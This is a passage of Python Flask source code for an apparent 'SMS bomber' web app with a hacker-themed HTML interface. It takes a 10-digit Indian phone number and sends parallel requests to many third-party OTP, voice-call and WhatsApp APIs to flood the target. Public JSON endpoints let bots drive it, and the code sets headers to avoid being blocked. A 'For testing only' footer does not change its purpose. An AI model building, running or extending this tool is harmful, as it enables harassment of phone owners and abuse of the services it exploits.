def send_request(api, phone):
    try:
        url = api['url'](phone) if callable(api['url']) else api['url'].format(phone=phone)
        headers = api.get('headers', {})
        # Add random headers to avoid blocking
        headers['Accept'] = '*/*'
        headers['Accept-Language'] = 'en-US,en;q=0.9'
        headers['Connection'] = 'keep-alive'
        
        data = None
        if api.get('data'):
            data = api['data'](phone) if callable(api['data']) else api['data'].format(phone=phone)
        
        if api['method'] == 'GET':
            r = requests.get(url, headers=headers, timeout=8)
        else:
            r = requests.post(url, headers=headers, data=data, timeout=8)
        
        return {"name": api['name'], "status": r.status_code, "success": r.status_code < 400}
    except Exception as e:
        return {"name": api['name'], "status": str(e), "success": False}

# ============ HTML UI ============
HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>💀 SHUVO & FELIX BOMBER 💀</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 550px; width: 100%; background: rgba(0,0,0,0.9); border-radius: 20px; padding: 25px; box-shadow: 0 0 50px rgba(255,0,0,0.3); border: 1px solid #ff0000; }
        h1 { text-align: center; color: #ff0000; font-size: 28px; margin-bottom: 10px; text-shadow: 0 0 10px red; }
        .keys { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; }
        .key { padding: 8px 20px; border-radius: 30px; font-weight: bold; }
        .key-shuvo { background: #ff0000; color: #fff; box-shadow: 0 0 15px red; }
        .key-felix { background: #0066ff; color: #fff; box-shadow: 0 0 15px blue; }
        .stats { text-align: center; margin-bottom: 20px; color: #0f0; font-size: 14px; }
        .input-group { margin-bottom: 15px; }
        input, select, button { width: 100%; padding: 14px; margin: 5px 0; background: #1a1a1a; border: 1px solid #ff0000; color: #0f0; border-radius: 10px; font-size: 16px; font-family: monospace; }
        button { background: #ff0000; color: #fff; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 18px; }
        button:hover { background: #cc0000; transform: scale(1.02); }
        .log { background: #0a0a0a; border: 1px solid #ff0000; border-radius: 10px; height: 300px; overflow-y: auto; padding: 10px; font-size: 11px; margin-top: 15px; }
        .log p { margin: 2px 0; font-family: monospace; }
        .success { color: #0f0; }
        .fail { color: #ff0000; }
        .info { color: #ffaa00; }
        .footer { text-align: center; margin-top: 15px; color: #666; font-size: 10px; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #1a1a1a; }
        ::-webkit-scrollbar-thumb { background: #ff0000; }
    </style>
</head>
<body>
    <div class="container">
        <h1>💀 BOMBER 💀</h1>
        <div class="keys">
            <span class="key key-shuvo">🔴 SHUVO</span>
            <span class="key key-felix">🔵 FELIX</span>
        </div>
        <div class="stats">
            📡 <span id="apiCount">{{count}}</span> APIs ACTIVE | ⚡ FAST MODE
        </div>
        <div class="input-group">
            <input type="tel" id="phone" placeholder="📱 Enter 10 digit number" maxlength="10">
        </div>
        <div class="input-group">
            <select id="key">
                <option value="SHUVO">🔴 SHUVO KEY</option>
                <option value="FELIX">🔵 FELIX KEY</option>
            </select>
        </div>
        <div class="input-group">
            <select id="mode">
                <option value="all">💀 ALL (SMS + Voice + WhatsApp)</option>
                <option value="sms">📱 SMS ONLY</option>
                <option value="voice">📞 VOICE CALL ONLY</option>
                <option value="whatsapp">💬 WHATSAPP ONLY</option>
            </select>
        </div>
        <button onclick="startBomb()">💣 START BOMBING 💣</button>
        <div class="log" id="log">
            <p class="info">⚡ Ready. Enter number and key. ⚡</p>
        </div>
        <div class="footer">⚠️ For testing only | SHUVO & FELIX</div>
    </div>
    <script>
        let eventSource = null;
        function startBomb() {
            let phone = document.getElementById('phone').value;
            let key = document.getElementById('key').value;
            let mode = document.getElementById('mode').value;
            
            if(!phone || phone.length < 10) {
                alert("❌ Enter valid 10 digit number!");
                return;
            }
            
            if(eventSource) eventSource.close();
            
            let logDiv = document.getElementById('log');
            logDiv.innerHTML = '<p class="info">🔥 BOMBING STARTED 🔥</p>';
            
            eventSource = new EventSource(`/api/bomb?phone=${phone}&key=${key}&mode=${mode}`);
            
            eventSource.onmessage = function(e) {
                let data = e.data;
                let p = document.createElement('p');
                if(data.includes('✅')) p.className = 'success';
                else if(data.includes('❌')) p.className = 'fail';
                else p.className = 'info';
                p.innerHTML = data;
                logDiv.appendChild(p);
                logDiv.scrollTop = logDiv.scrollHeight;
            };
            
            eventSource.onerror = function() {
                eventSource.close();
                eventSource = null;
            };
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML, count=len(APIS))

# ============ MAIN API ENDPOINT (Koi bhi use kar sakta hai) ============
@app.route('/api/bomb')
def bomb_api():
    def generate():
        phone = request.args.get('phone', '').strip()
        key = request.args.get('key', '').upper()
        mode = request.args.get('mode', 'all').lower()
        
        # Validate phone
        if not phone or len(phone) != 10 or not phone.isdigit():
            yield f"data: ❌ Invalid phone number! Use 10 digits only.\\n\\n"
            return
        
        # Validate key
        if key not in VALID_KEYS:
            yield f"data: ❌ Invalid key! Use SHUVO or FELIX\\n\\n"
            return
        
        # Filter APIs by mode
        filtered_apis = []
        for api in APIS:
            name_lower = api['name'].lower()
            if mode == 'all':
                filtered_apis.append(api)
            elif mode == 'sms' and 'voice' not in name_lower and 'whatsapp' not in name_lower:
                filtered_apis.append(api)
            elif mode == 'voice' and 'voice' in name_lower:
                filtered_apis.append(api)
            elif mode == 'whatsapp' and 'whatsapp' in name_lower:
                filtered_apis.append(api)
        
        if not filtered_apis:
            yield f"data: ❌ No APIs found for mode: {mode}\\n\\n"
            return
        
        yield f"data: 🔥 KEY: {key} | TARGET: +91{phone} | MODE: {mode.upper()} | APIS: {len(filtered_apis)}\\n\\n"
        
        success_count = 0
        fail_count = 0
        
        # Use ThreadPoolExecutor for parallel requests
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(send_request, api, phone): api for api in filtered_apis}
            for future in as_completed(futures):
                result = future.result()
                if result['success']:
                    success_count += 1
                    yield f"data: ✅ {result['name']} - {result['status']}\\n"
                else:
                    fail_count += 1
                    yield f"data: ❌ {result['name']} - {result['status']}\\n"
        
        yield f"data: \\n💀 BOMBING COMPLETE 💀\\n"
        yield f"data: ✅ SUCCESS: {success_count} | ❌ FAILED: {fail_count}\\n"
        yield f"data: 🔥 DONE 🔥\\n\\n"
    
    return Response(generate(), mimetype='text/event-stream')

# ============ SIMPLE JSON API (Bot/App ke liye) ============
@app.route('/api/simple')
def simple_api():
    """Simple JSON API - Koi bhi use kar sakta hai (Telegram Bot, WhatsApp Bot, etc)"""
    phone = request.args.get('phone', '').strip()
    key = request.args.get('key', '').upper()
    mode = request.args.get('mode', 'all').lower()
    
    if not phone or len(phone) != 10 or not phone.isdigit():
        return jsonify({"error": "Invalid phone number", "status": false, "phone": phone}), 400
    
    if key not in VALID_KEYS:
        return jsonify({"error": "Invalid key", "status": false, "valid_keys": ["SHUVO", "FELIX"]}), 401
    
    # Filter APIs
    filtered_apis = []
    for api in APIS:
        name_lower = api['name'].lower()
        if mode == 'all':
            filtered_apis.append(api)
        elif mode == 'sms' and 'voice' not in name_lower and 'whatsapp' not in name_lower:
            filtered_apis.append(api)
        elif mode == 'voice' and 'voice' in name_lower:
            filtered_apis.append(api)
        elif mode == 'whatsapp' and 'whatsapp' in name_lower:
            filtered_apis.append(api)
    
    # Send requests
    results = []
    success = 0
    fail = 0
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(send_request, api, phone): api for api in filtered_apis}
        for future in as_completed(futures):
            result = future.result()
            results.append(result)
            if result['success']:
                success += 1
            else:
                fail += 1
    
    return jsonify({
        "status": "completed",
        "key": key,
        "phone": f"+91{phone}",
        "mode": mode,
        "total_apis": len(filtered_apis),
        "success": success,
        "failed": fail,
        "results": results[:50]  # First 50 results only
    })

# ============ HEALTH CHECK ============
@app.route('/health')
def health():
    return jsonify({
        "status": "active",
        "apis_loaded": len(APIS),
        "voice_apis": len(voice_apis),
        "whatsapp_apis": len(whatsapp_apis),
        "sms_apis": len(sms_apis),
        "valid_keys": list(VALID_KEYS.keys())
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, threaded=True)